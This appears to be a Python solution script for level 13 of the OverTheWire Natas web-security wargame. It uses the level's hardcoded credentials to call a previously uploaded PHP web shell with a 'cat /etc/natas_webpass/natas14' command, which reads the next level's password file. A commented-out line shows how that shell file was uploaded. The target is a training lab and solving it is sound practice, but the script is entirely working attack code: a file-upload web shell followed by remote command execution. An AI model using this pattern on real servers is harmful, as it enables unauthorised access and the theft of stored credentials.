#!/bin/python
import requests
import re
import urllib
import base64

username = "natas13"
pwd = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
url = f"http://{username}.natas.labs.overthewire.org/upload/fu98lrlwf1.php?c=cat /etc/natas_webpass/natas14"
session = requests.Session()
response = session.get(url,auth=(username,pwd))
file={'uploadedfile':open('N13.php','rb')}
#response = session.post(url,files = file,data={'filename':'N12.php','MAX_FILE_SIZE':'1000'},auth=(username,pwd))
content=response.text
print(content)
